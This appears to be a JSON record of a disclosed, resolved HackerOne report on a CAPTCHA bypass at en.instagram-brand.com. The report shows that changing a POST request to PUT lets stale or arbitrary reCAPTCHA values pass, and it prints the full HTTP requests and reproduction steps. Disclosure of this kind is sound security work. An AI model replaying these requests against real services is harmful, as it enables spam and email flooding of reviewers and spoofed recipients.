@@ -1,0 +1,132 @@
+{
+  "id": 206653,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDY2NTM=",
+  "url": "https://hackerone.com/reports/206653",
+  "title": "Captcha bypass for the most important function - At en.instagram-brand.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-02-15T15:22:17.840Z",
+  "submitted_at": "2017-02-15T15:22:17.840Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "saurabhb",
+    "url": "/saurabhb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/guv3fgchgdb2dk1xb6ldsp78lkaf/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 111,
+    "url": "https://hackerone.com/automattic",
+    "handle": "automattic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Automattic",
+      "twitter_handle": "",
+      "website": "https://automattic.com",
+      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-06-22T14:13:02.661Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-05-23T14:13:02.251Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Product / URL**\n\nhttps://en.instagram-brand.com/wp-json/brc/v1/approval-requests\n\n**Description and Impact**\n\nThe Instagram Brand Site has a functionality for business users to request for using Instagram Assets.\nThe URL for creating a new request is: https://en.instagram-brand.com/requests/new\nThere is a CAPTCHA implementation on the last page to make sure that only legitimate users ask for this.\nBut, there is a way to bypass this CAPTCHA implementation.\n\n**Impact:**\nThe whole purpose of having the security feature of captcha has gone in vain. A malicious user can request for infinite times. The email is also sent to that user infinite times. This will create an overhead on those who reviews these request. Also if the malicious user spoofs the email, the actual holder of that email will be flooded with mails from Instagram site.\n\nNote: I did not sent this request to the intruder, otherwise the admin's dashboard would be flooded. But I am sure there is absolutely no rate limitation cause the captcha is broken.\n\n**Solution:**\nThere is a logical flaw in captcha implementation. Make sure that every request is checked for correct captcha and is then processed.\n\n\n**Reproduction Instructions / Proof of Concept**\n\n1. Create a new request by entering right captcha value.\n2. Intercept the request in a proxy tool.\n3. The request will look like this:\n\n`POST /wp-json/brc/v1/approval-requests HTTP/1.1\nHost: en.instagram-brand.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nX-WP-Nonce: 6e74d4f6be\nContent-Type: application/x-www-form-urlencoded\nReferer: https://en.instagram-brand.com/requests/new/3\nContent-Length: 692\nCookie: <the cookies here>\nConnection: keep-alive`\n\n`campaign-name=fdsfs&description=sdfsfsfsdfs&client=fasdfsdf&from-date=2017%2F01%2F31&to-date=2017%2F02%2F15&audience-reach=1%20-%2010%2C000&media-value=%2425%2C000%20-%20%24100%2C000&assets=11532%2C11534%2C11536&sizes=34&files=1486898411715-myjs.html&g-recaptcha-response=03AHJ_VuvtbNaOXuvMLpGNZ1r1sE8LRcGksdd_reTh3zIyz6vXE58GA_DMZfjMMLlm0gyc7qr4t5wV9YOE-CRw94WhnJn9DlIJmm2Ine1dRpiQt1x5D2-8DPgOHYxqzgYjp1bRHw2JdDDZlbfDklE0ikQlfnX6yvmX0XvQRAvUwVdoH_UZtVIrq9JolD_IfTRD9_nF2IQ7ibDU1B9dojCVuB9HQGQLmnSgQsHAP2NWg_PWJ6RsrgVEgbcke2qyNYpGTRVuU3WjyGDc53v7YwvGe2WhLU_jHFGDl-TSGD2rIZEJOJ4e6XozIKL0DGSilxXxAxG0saERnEEoKGO-05Fs9maB47ZxhhdoNnzMLNrRt8bK6rRYDO9UnxJ_2M-i9J0M34x9KI44cjm9E0aTM00VYuniBaKFkezqHg`\n\n\n4. Now change the method from POST to PUT and right submit the request.\n5. The request will look like:\n\n`PUT /wp-json/brc/v1/approval-requests HTTP/1.1\nHost: en.instagram-brand.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nX-WP-Nonce: 6e74d4f6be\nContent-Type: application/x-www-form-urlencoded\nReferer: https://en.instagram-brand.com/requests/new/3\nContent-Length: 692\nCookie: <the cookies here>\nConnection: keep-alive`\n\n`campaign-name=fdsfs&description=sdfsfsfsdfs&client=fasdfsdf&from-date=2017%2F01%2F31&to-date=2017%2F02%2F15&audience-reach=1%20-%2010%2C000&media-value=%2425%2C000%20-%20%24100%2C000&assets=11532%2C11534%2C11536&sizes=34&files=1486898411715-myjs.html&g-recaptcha-response=03AHJ_VuvtbNaOXuvMLpGNZ1r1sE8LRcGksdd_reTh3zIyz6vXE58GA_DMZfjMMLlm0gyc7qr4t5wV9YOE-CRw94WhnJn9DlIJmm2Ine1dRpiQt1x5D2-8DPgOHYxqzgY&`\n\n5. Repeat the request for any number of times and observe that every time instead of checking for a new captcha value, the old value or ANY VALUE from captcha is accepted.\n6. Please see the attached screenshots for exact requests and response and my dashboard as a real proof of concept.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 161122,
+      "file_name": "InstagramBrandCAPTCHABypassDashboard.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/161/122/600824fe104069ad60ed27d8c67a7f087b03b114/InstagramBrandCAPTCHABypassDashboard.png?response-content-disposition=attachment%3B%20filename%3D%22InstagramBrandCAPTCHABypassDashboard.png%22%3B%20filename%2A%3DUTF-8%27%27InstagramBrandCAPTCHABypassDashboard.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSL7NOIQC%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T014515Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCLSRLO6RFeN%2BGsoJ0LPj400jCFgjuqvvPPDFcsczzGpwIgJ7wyMKCj1fCMyhyGb3e38i72dM0rbWpk1YTQ%2BC%2Bjpo4quwUIov%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB5coCYEAEvuOphfUyqPBalUOlgecG%2FdXJOA5qOYfoWKN8AaGmY1u9FJbtTnV3KIO0%2BtMZ8WEVTEzxG9V1zbY%2BxoyNx14yRBpBjxqJgdmjHOLHhO2H%2FCxHgkxv6DhqdDLvnnmdhJM%2FEtu9oSyT4vyFFg4KdyPgeC4zZZAJ%2FcZCc08DXqdY1vWvOIZmt3Wl66ttIlFjclKMmmZ4MYPjzMxwsnmEeXWQeOzw8900Y1YYOXvXRzo%2FWYNBxg6k2SZ48KUhrZklGCJvL12d83irz2yCcL28EGuIvPpbT9D1BKaq8soDKxgeoNBQhs%2FOOQXD49%2BInYxfR2hNUI4zr6dGVpfVbPim6%2Fwog2Yv8FL5V2w8HS9bLO5X28Bugt5cCq3fpUHatWyxb2vmGJ8su7net8K0ZS7e3czsFYCQHs0LhFyFYOC0e73DMqM3%2Fszwd3BSGH89bhStFD4wv2ZNEA%2BCzOXlGUAQ%2BKpUfgQL9EhxI9tLJOUZP84DrCH%2BS1%2FOhAT6QwYTz71JS8FIveNIJmLR%2BsOOLDDPZFz9ETomqDUFuzr7UaAySiVYHBZD5RCuYtnU%2FPVFpMt2BSTGjtQS7iNoRh%2F0IPEHvBDmHvVDFDYGzRR9%2FFxK1CTa8nhmPSob%2B5UaTKs3xPM%2FvCdQj%2BG5cBzFPIMwvi2yfdu%2FXDqeUhIRazfYxLT8FHK3Y6BdDCU7vYTrxYt9zEB3bRhoO250G9HDGrS0zyDcKrw2KhOdP9z5Y%2FbQhUk9E5bdNhLAmvJWT0jZnyN9BFfYCcayb00ijRnnNVcv65HGFfrAkI6AnurwP9et9dlPhd4x86bDKMCzvps697hoUJ%2FczgpN%2B4YV2To3M8%2FfQCgSReQepqOOekzCeuvOyWC%2FE74no6GFy73tSXoVww9vjjzAY6sQG9po0vaBm3uLDJhpqSXK6TnsIjI1Gs1QFWjeEIdlPzDlkJXZD2mLqYH%2BgDzQ2M2PHxzM9aR5CAHO01jiyVnpwzTDeAiOdZzzB5cGdp%2FcSC92QotmG5WCmsXFXJ9k51Da5NUH5Xd07Uc7EeBU8PO8XyrQ2gC%2FE7J9n8aTriB6VR0bqKBZFIBao3CYhjiuTCamDz5M0TcT%2B0pXHQ9gjxgqOMPxmmKY9XtHGxGHrY0kUiB6k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8cbc5709e2b77de0f2c7440f3ade922275be960806ce534c5d2ac6c947f4ef92",
+      "file_size": 204851,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 161123,
+      "file_name": "InstagramBrandCAPTCHABypass.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/161/123/a001992ab8c64f460d5c8f51d759bae3015fc4a6/InstagramBrandCAPTCHABypass.png?response-content-disposition=attachment%3B%20filename%3D%22InstagramBrandCAPTCHABypass.png%22%3B%20filename%2A%3DUTF-8%27%27InstagramBrandCAPTCHABypass.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSL7NOIQC%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T014515Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCLSRLO6RFeN%2BGsoJ0LPj400jCFgjuqvvPPDFcsczzGpwIgJ7wyMKCj1fCMyhyGb3e38i72dM0rbWpk1YTQ%2BC%2Bjpo4quwUIov%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB5coCYEAEvuOphfUyqPBalUOlgecG%2FdXJOA5qOYfoWKN8AaGmY1u9FJbtTnV3KIO0%2BtMZ8WEVTEzxG9V1zbY%2BxoyNx14yRBpBjxqJgdmjHOLHhO2H%2FCxHgkxv6DhqdDLvnnmdhJM%2FEtu9oSyT4vyFFg4KdyPgeC4zZZAJ%2FcZCc08DXqdY1vWvOIZmt3Wl66ttIlFjclKMmmZ4MYPjzMxwsnmEeXWQeOzw8900Y1YYOXvXRzo%2FWYNBxg6k2SZ48KUhrZklGCJvL12d83irz2yCcL28EGuIvPpbT9D1BKaq8soDKxgeoNBQhs%2FOOQXD49%2BInYxfR2hNUI4zr6dGVpfVbPim6%2Fwog2Yv8FL5V2w8HS9bLO5X28Bugt5cCq3fpUHatWyxb2vmGJ8su7net8K0ZS7e3czsFYCQHs0LhFyFYOC0e73DMqM3%2Fszwd3BSGH89bhStFD4wv2ZNEA%2BCzOXlGUAQ%2BKpUfgQL9EhxI9tLJOUZP84DrCH%2BS1%2FOhAT6QwYTz71JS8FIveNIJmLR%2BsOOLDDPZFz9ETomqDUFuzr7UaAySiVYHBZD5RCuYtnU%2FPVFpMt2BSTGjtQS7iNoRh%2F0IPEHvBDmHvVDFDYGzRR9%2FFxK1CTa8nhmPSob%2B5UaTKs3xPM%2FvCdQj%2BG5cBzFPIMwvi2yfdu%2FXDqeUhIRazfYxLT8FHK3Y6BdDCU7vYTrxYt9zEB3bRhoO250G9HDGrS0zyDcKrw2KhOdP9z5Y%2FbQhUk9E5bdNhLAmvJWT0jZnyN9BFfYCcayb00ijRnnNVcv65HGFfrAkI6AnurwP9et9dlPhd4x86bDKMCzvps697hoUJ%2FczgpN%2B4YV2To3M8%2FfQCgSReQepqOOekzCeuvOyWC%2FE74no6GFy73tSXoVww9vjjzAY6sQG9po0vaBm3uLDJhpqSXK6TnsIjI1Gs1QFWjeEIdlPzDlkJXZD2mLqYH%2BgDzQ2M2PHxzM9aR5CAHO01jiyVnpwzTDeAiOdZzzB5cGdp%2FcSC92QotmG5WCmsXFXJ9k51Da5NUH5Xd07Uc7EeBU8PO8XyrQ2gC%2FE7J9n8aTriB6VR0bqKBZFIBao3CYhjiuTCamDz5M0TcT%2B0pXHQ9gjxgqOMPxmmKY9XtHGxGHrY0kUiB6k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eae878141a02267311ac1516f931e5adeecbc1b97dfdd8e6678609d18519a89e",
+      "file_size": 178619,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-06-22T14:13:02.324Z",
+  "allow_singular_disclosure_after": -210425532.70976874,
+  "singular_disclosure_allowed": true,
+  "vote_count": 59,
+  "voters": [
+    "aboalezz",
+    "megaknight",
+    "checkm50",
+    "thruster",
+    "base_64",
+    "ali",
+    "tess",
+    "metawolf",
+    "shubham_srt",
+    "thalaivar304",
+    "and 49 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
